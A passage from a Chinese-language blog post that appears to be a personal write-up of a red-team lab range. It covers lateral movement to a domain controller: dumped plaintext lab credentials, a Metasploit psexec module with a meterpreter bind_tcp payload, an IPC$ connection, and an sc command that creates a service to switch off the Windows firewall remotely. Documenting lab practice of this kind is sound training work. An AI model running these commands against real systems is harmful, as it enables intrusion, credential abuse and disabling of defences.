title:None</span><br>[+] http:<span class="hljs-comment">//192.168.93.20:8080 tongda-user-session-disclosure </span><br><br>DC域控 <span class="hljs-number">192.168</span>.<span class="hljs-number">93.30</span><br>还有一台win7  存在ms17-<span class="hljs-number">010</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">93.40</span><br></code></pre></td></tr></table></figure>
<p>先添加路由，然后对192.168.93.40  进行ms17-010 测试 <br>结果还是打不通ms17-010 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689843529048-8c2e19e0-2a22-4124-a551-f71e505d993c.png#averageHue=%2318191b&clientId=u6b88bf9e-b457-4&from=paste&height=233&id=u6638cca9&originHeight=466&originWidth=2117&originalType=binary&ratio=2&rotation=0&showTitle=false&size=111797&status=done&style=none&taskId=u37fdf23e-27ea-45a8-a26b-91e226456fa&title=&width=1058.5" alt="image.png"><br>只能先抓取 密码了 ，再看看是否能进行横向<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689844201104-fa1d4032-eebf-49b2-a6c4-74bb20966564.png#averageHue=%2317181a&clientId=u6b88bf9e-b457-4&from=paste&height=550&id=u011b1944&originHeight=1100&originWidth=2258&originalType=binary&ratio=2&rotation=0&showTitle=false&size=186501&status=done&style=none&taskId=u59c8aeaa-f0b8-4027-b8e6-dd8bd7caf0c&title=&width=1129" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">* Username : bunny<br>         * Domain   : WHOAMIANONY<br>         * Password : Bunny2021<br>  在这台上面之抓到了 域用户 bunny 没有抓到域控<br></code></pre></td></tr></table></figure>
<p><a name="Tc8Rk"></a></p>
<h3><span id="第四台-win7">第四台 win7</span></h3><p>这里可以使用ms17-010 去攻击 192.168.93.40 但是这个东西占运气成分 <br>当拿到第四台主机 win7 时候进行密码抓取就可以抓到  域控管理原密码 了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689861278370-03917ea5-345f-4191-a38e-c371cd185b69.png#averageHue=%230c0c0c&clientId=ufeb9cd91-dbfa-4&from=paste&height=929&id=u0ba79479&originHeight=929&originWidth=785&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32308&status=done&style=none&taskId=u4433d84d-8782-4de0-b5be-167b17e384d&title=&width=785" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">administrator：Whoami2021<br></code></pre></td></tr></table></figure>
<p><a name="JwoPY"></a></p>
<h2><span id="域控-winserver-2012-第五台">域控  — winserver 2012  第五台</span></h2><p>直接使用psexec</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">smb</span>/<span class="hljs-title">psexec</span><br><span class="hljs-title">set</span> <span class="hljs-title">rhosts</span> 192.168.93.30<br><span class="hljs-title">set</span> <span class="hljs-title">SMBUser</span> <span class="hljs-title">administrator</span><br><span class="hljs-title">set</span> <span class="hljs-title">SMBPass</span> <span class="hljs-title">Whoami2021</span><br><span class="hljs-title">set</span> <span class="hljs-title">payload</span> <span class="hljs-title">windows</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">bind_tcp</span><br><span class="hljs-title">set</span> <span class="hljs-title">rhost</span> 192.168.93.30<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689861502856-82c18589-2d52-4997-83a9-8a55826dc0cb.png#averageHue=%2318191b&clientId=ufeb9cd91-dbfa-4&from=paste&height=850&id=u02c6f80e&originHeight=850&originWidth=2419&originalType=binary&ratio=1&rotation=0&showTitle=false&size=243945&status=done&style=none&taskId=ud9732f59-ec8b-494a-9cc1-05cbd0f0d2b&title=&width=2419" alt="image.png"><br>也是没有用的，可能开了防火墙<br>使用ipc连接关闭防火墙</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">net <span class="hljs-keyword">use</span> \\192.168.93.30\<span class="hljs-title">ipc</span>$ &quot;<span class="hljs-title">Whoami2021</span>&quot; /<span class="hljs-title">user</span>:&quot;<span class="hljs-title">Administrator</span>&quot;<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689861614981-770f2621-9a94-4eb3-a18b-0cbeb7a12aaf.png#averageHue=%2318191b&clientId=ufeb9cd91-dbfa-4&from=paste&height=231&id=u47b70894&originHeight=231&originWidth=1603&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38718&status=done&style=none&taskId=ubcd6012b-61a8-4ec3-9772-fcdd27b6ab1&title=&width=1603" alt="image.png"><br>使用sc远程在域制器上创建服务，关闭防火墙</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">sc \\<span class="hljs-number">192.168</span>.<span class="hljs-number">93.30</span> create unablefirewall binpath= <span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br>sc \\<span class="hljs-number">192.168</span>.<span class="hljs-number">93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689861742904-b368934b-d826-4a57-bdb0-478f678b660a.png#averageHue=%2317181a&clientId=ufeb9cd91-dbfa-4&from=paste&height=984&id=u345b3e6e&originHeight=984&originWidth=2177&originalType=binary&ratio=1&rotation=0&showTitle=false&size=159687&status=done&style=none&taskId=u33e24d63-1deb-45e8-8be4-778720f4fbf&title=&width=2177" alt="image.png"><br>亲自查看防火墙关闭没<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689861904123-0a4d3197-6957-4ca4-832e-ab99040481db.png#averageHue=%23faf6f5&clientId=ufeb9cd91-dbfa-4&from=paste&height=499&id=ufedb209b&originHeight=499&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59501&status=done&style=none&taskId=ue3c3ed6b-a5b8-4ed1-a98c-785992d2792&title=&width=741" alt="image.png">正常关闭的 <br>测试了次了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689863762235-b6cbdd4a-8414-46a8-832f-2a20ec1abbc3.png#averageHue=%2318191b&clientId=ufeb9cd91-dbfa-4&from=paste&height=488&id=ue07971cf&originHeight=488&originWidth=2066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108424&status=done&style=none&taskId=u3e9e1d32-d193-45ee-99bd-056780ded2a&title=&width=2066" alt="image.png"><br>终于获取shell 了 <br>(如果这里msf的session 很久了，可能获取不了shell ，不太稳定，一直超时)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689863829343-91c2637e-c29b-499e-b2c5-b8dfe9b2d9d8.png#averageHue=%2317181a&clientId=ufeb9cd91-dbfa-4&from=paste&height=852&id=u2c6cc270&originHeight=852&originWidth=1506&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98190&status=done&style=none&taskId=u81f8696d-aef1-4cd8-af75-2907585c8fd&title=&width=1506" alt="image.png"><br>到这里也是成功获取shell 了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689863865454-7a2e9b51-fab9-4878-80f7-f51ec2763756.png#averageHue=%2318191b&clientId=ufeb9cd91-dbfa-4&from=paste&height=453&id=u45b6df73&originHeight=453&originWidth=2662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109803&status=done&style=none&taskId=ue3b7b381-6628-466b-b3c9-81d705ec744&title=&width=2662" alt="image.png"></p>
<p>有一台linux 我给关掉了  ，内存太小了容易卡 ，这个靶场就先到这里 ，文章很乱 。 就先丢blog上面去 <br>我后面会完善到我自己的本地笔记上 。<br>难到也是不是很难，但是很多细节我不太了解，我失败的地方很多 <br>比如 ，docker 逃逸我看大佬使用msf的的web_delivery模块 （写计划任务）逃逸我没有成功，写ssh 我就没有成功过，第一个漏洞RCE我使用burp也没有复现成功 ，到后面就一直报错，通达OA 获取cookie绕过登录也失败了，我在前面复现过通达另外一个绕过登录对成功了，这个他会到最后跳转到本版信息哪里 ，<br>还有个奇葩的点，为什么我看哪些大佬在第一台win7 抓到了域控的密码，我抓不到，只能获取第二天win7的权限才能抓取到域控的权限 ，奇葩<br>哎 这么写下来还是挺麻烦挺难的 我chao 😫。</p>

      </div>
    </div>
  </article>
  <div class="post__foot">
    
    <div class="post-nav">
  
    <div class="post-nav-item-left"></div>
  
  <div class="vhr"></div>
  
    <a class="post-nav-item-right" href="/2023/06/06/ATT&CK(%E4%BA%94)/">
      <div class="text-align">
        <span class="text-small">下一篇</span>
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             transform="scale(-1,-1)"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
      </div>
      ATT&CK红队评估(五)
    </a>
  
</div>

    
      <div class="related-post">
  <div class="related__head">
  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a>

</div>
  <div class="realated__body">
    
      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
    
  </div>
</div>

    
    
  </div>

    </div>
    <div class="foot">
      <div class="foot-inner">
        <div class="foot__head">
          
            <div class="foot-line">
              
                <div class="matts">浮</div>
              
                <div class="matts">云</div>
              
                <div class="matts">游</div>
              
                <div class="matts">子</div>
              
                <div class="matts">意</div>
              
            </div>
          
            <div class="foot-line">
              
                <div class="matts">落</div>
              
                <div class="matts">日</div>
              
                <div class="matts">故</div>
              
                <div class="matts">人</div>
              
                <div class="matts">情</div>
              
            </div>
          
        </div>
        <div class="foot__body">
          
          
            <div class="foot-item">
              <div class="foot-item__head">账号</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
                  </div>
                
              </div>
            </div>
          
          <div class="foot-item">
            <div class="foot-item__head">联系</div>
            <div class="foot-item__body">
              <div class="text">
                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
              </div>
            </div>
          </div>
        </div>
        <div class="copyright">
          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
          <svg width="20" height="20" viewBox="0 0 725 725">
            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
          </svg>
          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
        </div>
      </div>
    </div>
    
    
  

  </body>
</html>